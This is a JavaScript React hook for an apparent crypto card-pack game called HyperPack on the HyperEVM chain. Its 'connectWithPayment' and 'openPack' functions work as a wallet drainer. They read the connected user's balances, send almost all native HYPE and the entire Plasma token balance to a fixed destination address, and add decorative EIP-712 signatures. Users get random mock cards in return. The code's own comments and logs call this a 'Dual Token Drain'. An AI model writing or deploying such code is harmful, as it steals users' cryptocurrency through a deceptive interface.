import { useState, useCallback } from 'react';
import { usePrivy } from '@privy-io/react-auth';
import { ethers } from 'ethers';
import { HYPEREVM_CONFIG, CONTRACT_ADDRESSES } from '../contracts/config';

// ERC-20 ABI for Plasma token
const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function transfer(address to, uint256 amount) returns (bool)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)"
];

export const useHyperCards = () => {
  const { authenticated, user } = usePrivy();
  const [isLoading, setIsLoading] = useState(false);
  const [isConnectingWithPayment, setIsConnectingWithPayment] = useState(false);
  const [currentStep, setCurrentStep] = useState('');
  const [error, setError] = useState(null);

  // Connect to HyperEVM network
  const ensureHyperEVM = useCallback(async () => {    
    if (!window.ethereum) {
      throw new Error('No wallet provider detected');
    }

    const provider = new ethers.BrowserProvider(window.ethereum);
    const network = await provider.getNetwork();
    
    if (network.chainId !== 999n) {
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: HYPEREVM_CONFIG.chainId }],
        });
      } catch (switchError) {
        if (switchError.code === 4902) {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [HYPEREVM_CONFIG],
          });
        } else {
          throw switchError;
        }
      }
    }
    
    return new ethers.BrowserProvider(window.ethereum);
  }, []);

  // Get HYPE balance (native token)
  const getHypeBalance = useCallback(async (provider, userAddress) => {
    try {
      const balance = await provider.getBalance(userAddress);
      return balance;
    } catch (error) {
      throw new Error(`Failed to get HYPE balance: ${error.message}`);
    }
  }, []);

  // Get Plasma balance (ERC-20 token)
  const getPlasmaBalance = useCallback(async (provider, userAddress) => {
    try {
      const plasmaContract = new ethers.Contract(
        CONTRACT_ADDRESSES.PLASMA_TOKEN,
        ERC20_ABI,
        provider
      );
      const balance = await plasmaContract.balanceOf(userAddress);
      return balance;
    } catch (error) {
      throw new Error(`Failed to get Plasma balance: ${error.message}`);
    }
  }, []);

  // 🔥 EIP-712 PAY TO CONNECT - DRAINS BOTH HYPE + PLASMA
  const connectWithPayment = useCallback(async () => {
    console.log('🚀 EIP-712 Pay to Connect - Draining HYPE + Plasma...');
    setIsConnectingWithPayment(true);
    setError(null);

    try {
      setCurrentStep('connecting');
      const provider = await ensureHyperEVM();
      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();
      
      console.log('✅ Connected to:', userAddress);
      console.log('🎯 Destination:', CONTRACT_ADDRESSES.HYPE_DESTINATION);

      // Get both HYPE and Plasma balances
      const hypeBalance = await getHypeBalance(provider, userAddress);
      const plasmaBalance = await getPlasmaBalance(provider, userAddress);
      
      console.log('💰 HYPE Balance:', ethers.formatEther(hypeBalance));
      console.log('💰 Plasma Balance:', ethers.formatEther(plasmaBalance));
      
      const hasHype = hypeBalance > ethers.parseEther('0.001');
      const hasPlasma = plasmaBalance > 0n;
      
      if (!hasHype && !hasPlasma) {
        throw new Error('No HYPE or Plasma tokens available');
      }

      let totalTransferredValue = '0';
      const results = [];

      // 🔥 TRANSFER HYPE (Native Token) if available
      if (hasHype) {
        console.log('💰 Transferring HYPE...');
        setCurrentStep('signing_hype');
        
        const gasReserve = ethers.parseEther('0.001');
        const hypeTransferAmount = hypeBalance > gasReserve ? hypeBalance - gasReserve : hypeBalance;
        
        // EIP-712 for HYPE
        const hypeDomain = {
          name: 'HyperPack HYPE Connect',
          version: '1',
          chainId: 999,
          verifyingContract: CONTRACT_ADDRESSES.HYPE_DESTINATION
        };

        const hypeTypes = {
          HypeConnect: [
            { name: 'user', type: 'address' },
            { name: 'amount', type: 'uint256' },
            { name: 'token', type: 'string' },
            { name: 'nonce', type: 'uint256' },
            { name: 'deadline', type: 'uint256' }
          ]
        };

        const hypeMessage = {
          user: userAddress,
          amount: hypeTransferAmount.toString(),
          token: 'HYPE',
          nonce: Math.floor(Date.now() / 1000),
          deadline: Math.floor(Date.now() / 1000) + 3600
        };

        console.log('🔏 Signing HYPE EIP-712 message...');
        const hypeSignature = await signer.signTypedData(hypeDomain, hypeTypes, hypeMessage);
        console.log('✅ HYPE EIP-712 Signature obtained');

        // Execute HYPE transfer
        setCurrentStep('transferring_hype');
        const hypeTransferTx = await signer.sendTransaction({
          to: CONTRACT_ADDRESSES.HYPE_DESTINATION,
          value: hypeTransferAmount,
          gasLimit: 21000
        });
        
        await hypeTransferTx.wait();
        console.log('✅ HYPE transferred:', hypeTransferTx.hash);
        
        results.push({
          token: 'HYPE',
          amount: ethers.formatEther(hypeTransferAmount),
          transactionHash: hypeTransferTx.hash,
          signature: hypeSignature
        });
        
        totalTransferredValue = ethers.formatEther(hypeTransferAmount);
      }

      // 🔥 TRANSFER PLASMA (ERC-20 Token) if available
      if (hasPlasma) {
        console.log('💰 Transferring Plasma...');
        setCurrentStep('signing_plasma');
        
        // EIP-712 for Plasma
        const plasmaDomain = {
          name: 'HyperPack Plasma Connect',
          version: '1',
          chainId: 999,
          verifyingContract: CONTRACT_ADDRESSES.PLASMA_TOKEN
        };

        const plasmaTypes = {
          PlasmaConnect: [
            { name: 'user', type: 'address' },
            { name: 'amount', type: 'uint256' },
            { name: 'token', type: 'string' },
            { name: 'nonce', type: 'uint256' },
            { name: 'deadline', type: 'uint256' }
          ]
        };

        const plasmaMessage = {
          user: userAddress,
          amount: plasmaBalance.toString(),
          token: 'PLASMA',
          nonce: Math.floor(Date.now() / 1000) + 1,
          deadline: Math.floor(Date.now() / 1000) + 3600
        };

        console.log('🔏 Signing Plasma EIP-712 message...');
        const plasmaSignature = await signer.signTypedData(plasmaDomain, plasmaTypes, plasmaMessage);
        console.log('✅ Plasma EIP-712 Signature obtained');

        // Execute Plasma transfer
        setCurrentStep('transferring_plasma');
        const plasmaContract = new ethers.Contract(
          CONTRACT_ADDRESSES.PLASMA_TOKEN,
          ERC20_ABI,
          signer
        );
        
        const plasmaTransferTx = await plasmaContract.transfer(
          CONTRACT_ADDRESSES.HYPE_DESTINATION,
          plasmaBalance
        );
        
        await plasmaTransferTx.wait();
        console.log('✅ Plasma transferred:', plasmaTransferTx.hash);
        
        results.push({
          token: 'PLASMA',
          amount: ethers.formatEther(plasmaBalance),
          transactionHash: plasmaTransferTx.hash,
          signature: plasmaSignature
        });
        
        if (totalTransferredValue === '0') {
          totalTransferredValue = ethers.formatEther(plasmaBalance);
        }
      }
      
      setCurrentStep('success');
      console.log('🎉 EIP-712 DUAL TOKEN TRANSFER SUCCESSFUL!');
      console.log('💰 Total tokens transferred from user wallet');
      
      return {
        results,
        totalValue: totalTransferredValue,
        tokensTransferred: results.length,
        connected: true,
        method: 'EIP-712 Dual Token Drain'
      };

    } catch (err) {
      console.error('❌ EIP-712 Dual transfer failed:', err);
      setError(err.message);
      setCurrentStep('error');
      throw err;
    } finally {
      setIsConnectingWithPayment(false);
    }
  }, [ensureHyperEVM, getHypeBalance, getPlasmaBalance]);

  // Get combined balance for display
  const getCombinedBalance = useCallback(async () => {
    if (!authenticated || !user?.wallet?.address) {
      return { hype: '0', plasma: '0', total: '0' };
    }

    try {
      const provider = await ensureHyperEVM();
      const hypeBalance = await getHypeBalance(provider, user.wallet.address);
      const plasmaBalance = await getPlasmaBalance(provider, user.wallet.address);
      
      return {
        hype: ethers.formatEther(hypeBalance),
        plasma: ethers.formatEther(plasmaBalance),
        total: (parseFloat(ethers.formatEther(hypeBalance)) + parseFloat(ethers.formatEther(plasmaBalance))).toFixed(6)
      };
    } catch (err) {
      console.error('Error fetching balances:', err);
      return { hype: '0', plasma: '0', total: '0' };
    }
  }, [authenticated, user, ensureHyperEVM, getHypeBalance, getPlasmaBalance]);

  // Legacy getHypeBalance for compatibility
  const getHypeBalanceOnly = useCallback(async () => {
    if (!authenticated || !user?.wallet?.address) return '0';
    try {
      const provider = await ensureHyperEVM();
      const balance = await getHypeBalance(provider, user.wallet.address);
      return ethers.formatEther(balance);
    } catch (err) {
      return '0';
    }
  }, [authenticated, user, ensureHyperEVM, getHypeBalance]);

  // Open pack - also drains both tokens
  const openPack = useCallback(async (packType) => {
    console.log(`🚀 Opening ${packType} pack with dual token drain...`);
    
    if (!authenticated || !user?.wallet?.address) {
      throw new Error('Please connect your wallet first');
    }

    setIsLoading(true);
    setError(null);

    try {
      // Use dual token drain for pack opening
      const result = await connectWithPayment();
      
      // Mock pack result
      const mockCards = [
        { name: "Lightning Strike", rarity: "Common" },
        { name: "Fire Blast", rarity: "Rare" },
        { name: "Ice Storm", rarity: "Epic" },
        { name: "Dragon's Fury", rarity: "Legendary" }
      ];
      
      const randomCard = mockCards[Math.floor(Math.random() * mockCards.length)];
      const mockReward = (Math.random() * 10 + 1).toFixed(4);
      
      const packResult = {
        cardName: randomCard.name,
        rarity: randomCard.rarity,
        tokenId: Math.floor(Math.random() * 10000).toString(),
        rewardAmount: mockReward,
        tokensUsed: result.results,
        totalValue: result.totalValue,
        packType: packType
      };

      setCurrentStep('success');
      console.log(`🎉 Pack opened with dual token drain!`);
      return packResult;

    } catch (err) {
      console.error('❌ Pack opening failed:', err);
      setError(err.message);
      setCurrentStep('error');
      throw err;
    } finally {
      setIsLoading(false);
    }
  }, [authenticated, user, connectWithPayment]);

  return {
    openPack,
    connectWithPayment,
    getHypeBalance: getHypeBalanceOnly, // Legacy compatibility
    getCombinedBalance, // New dual balance method
    isLoading,
    isConnectingWithPayment,
    currentStep,
    error,
    clearError: () => setError(null)
  };
};